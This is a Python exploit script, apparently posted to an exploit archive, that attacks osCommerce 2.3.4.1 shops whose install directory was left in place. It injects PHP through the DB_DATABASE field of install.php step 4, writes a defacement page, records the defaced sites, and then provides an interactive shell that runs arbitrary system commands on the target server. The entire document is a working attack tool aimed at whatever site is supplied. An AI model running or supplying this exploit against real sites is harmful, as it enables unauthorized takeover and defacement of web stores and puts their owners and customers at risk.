# Exploit Title: OsCommerce 2.3.4.1 - Remote Code Execution Exploit
# Date: 31-03-2018
# Exploit Author: iran-cyber
# Vendor Homepage: oscommerce.com
# Software Link: library.oscommerce.com/Online&en&oscom_2_3&release_notes&v2_3_4_1
# Version: 2.3.4.1
# Tested on: windows/linux

#!/usr/bin/python27
# https://0day.today/exploit/30088
# Automatic Upload shell And Index
# Developed By ICG
import requests, sys, os

Banner = '''

           osCommerce 2.3 Remote Code Execution Exploit
                     0day.today/exploit/30088
               Exploit Developed By Iran-cyber.Net           
                        White HaT Hackers
                       
'''


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])





def osCommerce(site):
    try:
        CheckVuln = requests.get('http://' + site + '/install/index.php', timeout=5)
        if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
            print('     [+] ' + site + ' --> vulnerable!')
            print('     [+] ' + site + ' --> Posting Payload...')
            Exp = site + '/install/install.php?step=4'
            data = {
                'DIR_FS_DOCUMENT_ROOT': './'
            }
            deface = '\');'
            deface += 'system("echo Vuln!! patch it Now!> ../../vuln.html");'
            deface += '/*'
            data['DB_DATABASE'] = deface
            r = requests.post(url='http://' + Exp, data=data, timeout=5)
            if r.status_code == 200:
                print('     [+] ' + site + ' --> Payload Sent Successfully!')
                requests.get('http://' + site + '/install/includes/configure.php', timeout=5)
                CheckIndex = requests.get('http://' + site + '/vuln.html', timeout=5)
                if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                    print('     [+] ' + site + '/vuln.html --> Deface Uploaded')
                    with open('deface.txt', 'a') as writer:
                        writer.write(site + '/vuln.html' + '\n')
                    try:
                        flag = True
                        while flag:
                            cm = raw_input(' ICG-Shell$ ')
                            if cm == 'Exit' or cm == 'exit':
                                flag = False
                                break
                            shell = '\');'
                            shell += 'system("echo 0day-------");'
                            shell += 'system("' + cm + '");'
                            shell += '/*'
                            data['DB_DATABASE'] = shell
                            requests.post(url='http://' + Exp, data=data, timeout=5)
                            rez = requests.get('http://' + site + '/install/includes/configure.php', timeout=5)
                            print(rez.text.encode('utf-8').split('0day-------')[1])
                    except:
                        pass
                else:
                    print('     [-] ' + site + ' --> payload OK but Index and Commend Not Executed!')
            else:
                print('     [-] ' + site + ' --> Payload Sent Not Successfully!')
        else:
            print('     [-] ' + site + '/install/index.php --> Not Found! Not Vuln!')
    except:
        print('     [-] ' + site + ' --> Timeout or Url not valid!')


if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except:
        cls()
        print(Banner)
        print('           -----------------------------------------')
        print('              Usage: python Script.py target.com')
        sys.exit()

    if url.startswith('http://'):
        url = url.replace('http://', '')
    elif url.startswith('https://'):
        url = url.replace('https://', '')
    else:
        pass
    cls()
    print(Banner)
    osCommerce(url)
